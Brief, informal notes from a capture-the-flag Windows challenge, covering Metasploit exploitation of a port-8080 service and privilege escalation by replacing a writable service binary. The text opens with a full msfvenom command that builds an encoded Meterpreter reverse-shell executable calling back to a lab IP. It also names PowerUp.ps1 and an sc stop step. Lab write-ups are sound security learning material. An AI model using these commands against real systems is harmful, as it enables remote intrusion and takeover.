msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.107.148 LPORT=4445 -e x86/shikata_ga_nai -f exe > ASCService.exe

We start the challenge with an nmap scan and notice an HTTP server on port 8080 is runing [fill in]

using metasploit we find an exploit and run it, setting our RHOST to the host ip and the RPORT to port 8080

we find the user flag in desktop and now we need to find root flag

can not change process to spoolsv.exe due to missing permissions

we use a powershell script [PowerUp.ps1] to assist us in exploiting this

we load up powershell and list Invoces-GetChecks and find a service that is executable as our user

now we upload an exploit using msfvenom to reverse tcp into the system

attempt to upload the service using upload in meterpreter but the service can not be uploaded since the service is still running

we get back onto power shell and turn off the service using
`sc stop AdvancedSystemCareService9`

now we open another metasploit sessions that will be reverse tcping into the windows system

